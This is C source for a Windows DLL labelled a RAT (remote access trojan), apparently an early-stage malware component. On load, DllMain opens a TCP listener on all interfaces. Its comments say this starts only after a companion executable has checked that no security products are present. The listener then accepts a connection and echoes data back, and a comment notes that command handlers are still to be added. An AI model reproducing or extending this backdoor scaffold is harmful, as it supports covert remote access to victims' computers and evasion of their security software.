// Patrick Sacchet
// Verison 1.0
// Defines the entry point for the DLL application; main handler for user specific calls

#include "RAT-Dll-Main.h"


INT startListen()
{
    WORD wsaVersion;
    WSADATA wsaData;
    SOCKET clientSock, serverSock;
    SOCKADDR_IN client;
    int status= SUCCESS;
    int sendStatus = 0;
    int recvBufLen = DEFAULT_BUF_LEN;
    char recvBuf [DEFAULT_BUF_LEN];

    wsaVersion = MAKEWORD(2, 2);

    status = WSAStartup(wsaVersion, &wsaData);
    if (status != SUCCESS)
    {
        sprintf_s(msgBuf, "RAT-Dll-Main::startListen - Failed WSAStartup! Error code %u\n", status);
        OutputDebugStringA(msgBuf);
        goto cleanup;
    }

    OutputDebugStringA("WSAStartup was successful! \n");

    // Information for target
    client.sin_family = AF_INET;
    client.sin_port = htons(PORT_NUM);

    // Accept any IP address
    client.sin_addr.s_addr = htonl(INADDR_ANY);
    clientSock = INVALID_SOCKET;
    serverSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (serverSock == INVALID_SOCKET)
    {
        OutputDebugStringA("RAT-Dll-Main::startListen - Failed to create socket! \n");
        status = FAILURE;
        goto cleanup;
    }

    if (bind(serverSock, (LPSOCKADDR)&client, sizeof(client)) == SOCKET_ERROR)
    {
        OutputDebugStringA("RAT-Dll-Main::startListen - Failed to bind to socket! \n");
        status = FAILURE;
        goto cleanup;
    }

    sprintf_s(msgBuf, "RAT-Dll-Main::startListen - Listening on port %u\n", PORT_NUM);
    OutputDebugStringA(msgBuf);

    status = listen(serverSock, SOMAXCONN);
    if (status == SOCKET_ERROR)
    {
        OutputDebugStringA("RAT-Dll-Main::startListen - Socket error ! \n");
        // TODO - move this to cleanup? check if socket is open anyway first 
        closesocket(serverSock);
        WSACleanup();
        goto cleanup;
    }

    clientSock = accept(serverSock, NULL, NULL);
    if (clientSock == INVALID_SOCKET)
    {
        OutputDebugStringA("RAT-Dll-Main::startListen - Invalid socket from client! \n");
        // TODO - move this to cleanup? check if socket is open anyway first 
        closesocket(serverSock);
        WSACleanup();
        goto cleanup;
     }

    // Close server socket since we no longer need it 
    closesocket(serverSock);

    // Receive from client until the peer shuts down the connection
    do
    {
        printf("Waiting for more bytes... \n");
        status = recv(clientSock, recvBuf, recvBufLen, 0);
        if (status > 0)
        {
            printf( "Bytes received: %d \n", status);

            sendStatus = send(clientSock, recvBuf, status, 0);
            if (sendStatus == SOCKET_ERROR)
            {
                printf( "Send error: %d \n", sendStatus);
                closesocket(clientSock);
                WSACleanup();
                return FALSE;
            }
            printf("Bytes sent: %d \n", sendStatus);
        }
        else if (status == 0)
        {
            printf("Closing socket... \n");
        }
        else
        {
            printf("Recv failed with error %d \n", WSAGetLastError());
            closesocket(clientSock);
            WSACleanup();
            return FALSE;
        }

    } while (status > 0);

    // shutdown connection since we're done
    status = shutdown(clientSock, SD_SEND);
    if (status == SOCKET_ERROR)
    {
        printf("Shutdown failed with error: %d \n", WSAGetLastError());
        closesocket(clientSock);
        WSACleanup();
        return FALSE;
    }

    closesocket(clientSock);
    WSACleanup();

    // Parse initial packet data and call appropiate handler from here
cleanup:
    return status;
}


// update build
INT APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    INT status = SUCCESS;
    switch (ul_reason_for_call)
    {
        // Executable has surveyed environment and deemed it safe to operate; make calls specific to functionality here
        case DLL_PROCESS_ATTACH:
        {
            sprintf_s(msgBuf, "RAT-Dll-Main::DllMain - Detected process attach; assumping enironment is PSP safe and starting socket listen on port %d", PORT_NUM);
            OutputDebugStringA(msgBuf);
            // Pass control to our listening function and wait for user input 
            status = startListen();
            if (status != SUCCESS)
            {
                sprintf_s(msgBuf, "RAT-Dll-Main::DllMain - startListen call failed! returned %i", status);
                OutputDebugStringA(msgBuf);
                return status;
            }
            OutputDebugStringA("RAT-Dll-Main::DllMain - startListen returned success! \n");
            break;
        }
        case DLL_THREAD_ATTACH:
        {
            break;
        }
        case DLL_THREAD_DETACH:
        {
            break;
        }
        // General cleanup before detaching and de-loading out of memory
        case DLL_PROCESS_DETACH:
        {
            OutputDebugStringA("RAT-Dll-Main::DllMain - PROCESS_DETACH detected; cleaning up... \n");
            break;
        }
    }

    return SUCCESS;
}

